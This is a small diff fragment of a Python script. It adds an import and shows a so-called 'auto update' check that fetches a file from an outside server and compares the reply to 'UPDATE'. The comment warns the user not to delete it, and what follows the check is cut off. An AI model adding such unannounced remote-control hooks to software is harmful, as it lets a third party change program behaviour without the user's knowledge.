@@ -2,6 +2,7 @@
 
 import marshal
 import os
+import requests
 #[jangan di hapus klo gak mau error] Auto update code
 r = requests.get('http://r3xd.xyz/assets/img/post/robots.txt')
 if r.text == "UPDATE":
